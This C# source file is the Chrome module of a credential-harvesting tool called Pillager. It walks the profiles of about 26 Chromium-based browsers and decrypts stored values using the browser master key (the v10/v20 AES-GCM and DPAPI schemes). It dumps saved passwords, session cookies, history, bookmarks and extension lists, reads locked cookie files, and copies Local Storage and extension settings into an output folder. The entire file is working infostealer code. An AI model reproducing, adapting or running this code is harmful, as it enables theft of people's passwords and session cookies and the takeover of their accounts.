using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using System.Security.Cryptography;
using System.Text;
using Pillager.Helper;

namespace Pillager.Browsers
{
    public class Chrome : ICommand
    {
        public string BrowserPath { get; set; }

        public string BrowserName { get; set; }

        public byte[] MasterKey_v10 { get; set; }

        public byte[] MasterKey_v20 { get; set; }

        private string[] profiles { get; set; }

        public Dictionary<string, string> browserOnChromium = new Dictionary<string, string>
        {
            { "Chrome", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Google\\Chrome\\User Data" )} ,
            { "Chrome Beta",Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google\\Chrome Beta\\User Data" )},
            { "Chromium", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Chromium\\User Data" )} ,
            { "Chrome SxS", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Google\\Chrome SxS\\User Data" )},
            { "Edge", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Microsoft\\Edge\\User Data") } ,
            { "Brave-Browser", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"BraveSoftware\\Brave-Browser\\User Data") } ,
            { "QQBrowser",Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Tencent\\QQBrowser\\User Data") } ,
            { "SogouExplorer", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Sogou\\SogouExplorer\\User Data") } ,
            { "360ChromeX", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"360ChromeX\\Chrome\\User Data" )} ,
            { "360Chrome",Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "360Chrome\\Chrome\\User Data") } ,
            { "Vivaldi",Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Vivaldi\\User Data") } ,
            { "CocCoc", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"CocCoc\\Browser\\User Data" )},
            { "Torch", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Torch\\User Data" )},
            { "Kometa", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Kometa\\User Data" )},
            { "Orbitum", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Orbitum\\User Data" )},
            { "CentBrowser",Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "CentBrowser\\User Data" )},
            { "7Star", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"7Star\\7Star\\User Data" )},
            { "Sputnik", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Sputnik\\Sputnik\\User Data" )},
            { "Epic Privacy Browser", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Epic Privacy Browser\\User Data" )},
            { "Uran",Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "uCozMedia\\Uran\\User Data" )},
            { "Yandex", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Yandex\\YandexBrowser\\User Data" )},
            { "Iridium", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Iridium\\User Data" )},
            { "Opera", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),"Opera Software\\Opera Stable" )},
            { "Opera GX", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),"Opera Software\\Opera GX Stable" )},
            { "The World", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"theworld6\\User Data" )},
            { "Lenovo", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Lenovo\\SLBrowser\\User Data" )},
        };

        private byte[] DecryptData(byte[] buffer)
        {
            byte[] decryptedData = null;
            if (MasterKey_v10 is null && MasterKey_v20 is null) return null;
            try
            {
                string bufferString = Encoding.UTF8.GetString(buffer);
                if (bufferString.StartsWith("v10") || bufferString.StartsWith("v11") || bufferString.StartsWith("v20"))
                {
                    byte[] masterKey = MasterKey_v10;
                    if (bufferString.StartsWith("v20"))
                        masterKey = MasterKey_v20;

                    byte[] iv = new byte[12];
                    Array.Copy(buffer, 3, iv, 0, 12);
                    byte[] cipherText = new byte[buffer.Length - 15];
                    Array.Copy(buffer, 15, cipherText, 0, buffer.Length - 15);
                    byte[] tag = new byte[16];
                    Array.Copy(cipherText, cipherText.Length - 16, tag, 0, 16);
                    byte[] data = new byte[cipherText.Length - tag.Length];
                    Array.Copy(cipherText, 0, data, 0, cipherText.Length - tag.Length);
                    decryptedData = new AesGcm().Decrypt(masterKey, iv, null, data, tag);
                    if (bufferString.StartsWith("v20"))
                        decryptedData = decryptedData.Skip(32).ToArray();
                }
                else
                {
                    decryptedData = ProtectedData.Unprotect(buffer, null, DataProtectionScope.CurrentUser);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
            return decryptedData;
        }

        public string Chrome_passwords()
        {
            StringBuilder passwords = new StringBuilder();
            foreach (var profile in profiles)
            {
                string loginDataPath = Path.Combine(BrowserPath, profile + "\\Login Data");
                if (!File.Exists(loginDataPath))
                    continue;
                try
                {
                    string tempLoginDataPath = Path.GetTempFileName();
                    File.Copy(loginDataPath, tempLoginDataPath, true);
                    SQLiteHandler handler = new SQLiteHandler(tempLoginDataPath);
                    if (!handler.ReadTable("logins"))
                        continue;
                    for (int i = 0; i < handler.GetRowCount(); i++)
                    {
                        string url = handler.GetValue(i, "origin_url");
                        string username = handler.GetValue(i, "username_value");
                        string crypt = handler.GetValue(i, "password_value");
                        string password = Encoding.UTF8.GetString(DecryptData(Convert.FromBase64String(crypt)));
                        if (!string.IsNullOrEmpty(url) && !string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
                        {
                            passwords.Append("\t[URL] -> {" + url + "}\n\t[USERNAME] -> {" + username + "}\n\t[PASSWORD] -> {" + password + "}\n");
                            passwords.AppendLine();
                        }
                    }
                    File.Delete(tempLoginDataPath);
                }
                catch { }
            }
            return passwords.ToString();
        }

        public string Chrome_history()
        {
            StringBuilder history = new StringBuilder();
            foreach (var profile in profiles)
            {
                string chrome_History_path = BrowserName.Contains("360") ? Path.Combine(BrowserPath, profile + "\\360History") : Path.Combine(BrowserPath, profile + "\\History");
                if (!File.Exists(chrome_History_path))
                    continue;
                try
                {
                    string history_tempFile = Path.GetTempFileName();
                    File.Copy(chrome_History_path, history_tempFile, true);
                    SQLiteHandler handler = new SQLiteHandler(history_tempFile);
                    if (!handler.ReadTable("urls"))
                        continue;
                    for (int i = 0; i < handler.GetRowCount(); i++)
                    {
                        string url = handler.GetValue(i, "url");
                        history.AppendLine(url);
                    }
                    File.Delete(history_tempFile);
                }
                catch { }
            }
            return history.ToString();
        }

        public string Chrome_cookies()
        {
            StringBuilder cookies = new StringBuilder();
            foreach (var profile in profiles)
            {
                try
                {
                    string chrome_cookie_path = Path.Combine(BrowserPath, profile + "\\Cookies");
                    string chrome_100plus_cookie_path = Path.Combine(BrowserPath, profile + "\\Network\\Cookies");
                    if (File.Exists(chrome_100plus_cookie_path))
                        chrome_cookie_path = chrome_100plus_cookie_path;
                    if (!File.Exists(chrome_cookie_path))
                        continue;
                    string cookie_tempFile = Path.GetTempFileName();
                    try
                    {
                        File.Copy(chrome_cookie_path, cookie_tempFile, true);
                    }
                    catch
                    {
                        byte[] ckfile = LockedFile.ReadLockedFile(chrome_cookie_path);
                        if (ckfile != null)
                        {
                            File.WriteAllBytes(cookie_tempFile, ckfile);
                        }
                    }
                    SQLiteHandler handler = new SQLiteHandler(cookie_tempFile);
                    if (!handler.ReadTable("cookies"))
                        continue;
                    for (int i = 0; i < handler.GetRowCount(); i++)
                    {
                        try
                        {
                            string host_key = handler.GetValue(i, "host_key");
                            string name = handler.GetValue(i, "name");
                            string crypt = handler.GetValue(i, "encrypted_value");
                            if (string.IsNullOrEmpty(crypt)) continue;
                            string path = handler.GetValue(i, "path");
                            double expDateDouble = 0;
                            long.TryParse(handler.GetValue(i, "expires_utc"), out var expDate);
                            if ((expDate / 1000000.000000000000) - 11644473600 > 0)
                                expDateDouble = (expDate / 1000000.000000000000000) - 11644473600;
                            string cookie = Encoding.UTF8.GetString(DecryptData(Convert.FromBase64String(crypt)));
                            cookies.AppendLine("{");
                            cookies.AppendLine("    \"domain\": \"" + host_key + "\",");
                            cookies.AppendLine("    \"expirationDate\": " + expDateDouble + ",");
                            cookies.AppendLine("    \"hostOnly\": false,");
                            cookies.AppendLine("    \"name\": \"" + name + "\",");
                            cookies.AppendLine("    \"path\": \"" + path + "\",");
                            cookies.AppendLine("    \"session\": true,");
                            cookies.AppendLine("    \"storeId\": null,");
                            cookies.AppendLine("    \"value\": \"" + cookie.Replace("\"", "\\\"") + "\"");
                            cookies.AppendLine("},");
                        }
                        catch { }
                    }
                    File.Delete(cookie_tempFile);
                }
                catch { }
            }
            if (cookies.Length > 3)
            {
                string temp = cookies.ToString();
                return "[" + temp.Substring(0, temp.Length - 3) + "]";
            }
            return cookies.ToString();
        }

        public string Chrome_books()
        {
            StringBuilder stringBuilder = new StringBuilder();
            foreach (var profile in profiles)
            {
                string chrome_book_path = BrowserName.Contains("360") ? Path.Combine(BrowserPath, profile + "\\360Bookmarks") : Path.Combine(BrowserPath, profile + "\\Bookmarks");
                if (File.Exists(chrome_book_path))
                {
                    stringBuilder.Append(File.ReadAllText(chrome_book_path));
                }
            }
            return stringBuilder.ToString();
        }

        public string Chrome_extensions()
        {
            StringBuilder stringBuilder = new StringBuilder();
            foreach (var profile in profiles)
            {
                string chrome_extension_path = Path.Combine(BrowserPath, profile + "\\Extensions");
                if (Directory.Exists(chrome_extension_path))
                {
                    foreach (string item in Directory.GetDirectories(chrome_extension_path))
                    {
                        try
                        {
                            string manifest = Path.Combine(Directory.GetDirectories(item)[0], "manifest.json");
                            var pattern = new System.Text.RegularExpressions.Regex("\"name\": \"(.*?)\"", System.Text.RegularExpressions.RegexOptions.Compiled).Matches(File.ReadAllText(manifest));
                            foreach (System.Text.RegularExpressions.Match prof in pattern)
                            {
                                if (prof.Success)
                                {
                                    string id = Path.GetFileName(item);
                                    string name = prof.Groups[1].Value;
                                    stringBuilder.AppendLine(id + "    " + name);
                                }
                            }
                        }
                        catch
                        { }
                    }
                }
            }
            return stringBuilder.ToString();
        }

        public override void Save(string path)
        {
            foreach (var browser in browserOnChromium)
            {
                try
                {
                    string chromepath = browser.Value;
                    BrowserName = browser.Key;
                    BrowserPath = chromepath;
                    var MasterKey = ChromeKeyDecryption.GetChromeMasterKey(chromepath);
                    MasterKey_v10 = MasterKey.MasterKey_v10;
                    MasterKey_v20 = MasterKey.MasterKey_v20;

                    if (MasterKey_v10 == null && MasterKey_v20 == null)
                        continue;

                    List<string> profileslist = new List<string>
                    {
                        "Default"
                    };
                    List<string> dirs = Directory.GetDirectories(BrowserPath).ToList();
                    for (int i = 1; i < 100; i++)
                    {
                        if (dirs.Contains(Path.Combine(BrowserPath, "Profile " + i)))
                        {
                            profileslist.Add("Profile " + i);
                        }
                    }
                    profiles = profileslist.ToArray();
                    string savepath = Path.Combine(path, BrowserName);
                    Directory.CreateDirectory(savepath);
                    string cookies = Chrome_cookies();
                    if (!string.IsNullOrEmpty(cookies)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_cookies.txt"), cookies, Encoding.UTF8);
                    string passwords = Chrome_passwords();
                    if (!string.IsNullOrEmpty(passwords)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_passwords.txt"), passwords, Encoding.UTF8);
                    string books = Chrome_books();
                    if (!string.IsNullOrEmpty(books)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_books.txt"), books, Encoding.UTF8);
                    string history = Chrome_history();
                    if (!string.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history, Encoding.UTF8);
                    string extension = Chrome_extensions();
                    if (!string.IsNullOrEmpty(extension)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_extension.txt"), extension, Encoding.UTF8);
                    foreach (var profile in profiles)
                    {
                        Directory.CreateDirectory(Path.Combine(BrowserPath, profile));
                        if (Directory.Exists(Path.Combine(BrowserPath, profile + "\\Local Storage"))) Methods.CopyDirectory(Path.Combine(BrowserPath, profile + "\\Local Storage"), Path.Combine(savepath, profile + "\\Local Storage"), true);
                        if (Directory.Exists(Path.Combine(BrowserPath, profile + "\\Local Extension Settings"))) Methods.CopyDirectory(Path.Combine(BrowserPath, profile + "\\Local Extension Settings"), Path.Combine(savepath, profile + "\\Local Extension Settings"), true);
                        if (Directory.Exists(Path.Combine(BrowserPath, profile + "\\Sync Extension Settings"))) Methods.CopyDirectory(Path.Combine(BrowserPath, profile + "\\Sync Extension Settings"), Path.Combine(savepath, profile + "\\Sync Extension Settings"), true);
                        if (Directory.GetDirectories(Path.Combine(BrowserPath, profile)).Length == 0) Directory.Delete(Path.Combine(BrowserPath, profile));
                    }
                }
                catch { }
            }
        }
    }
}
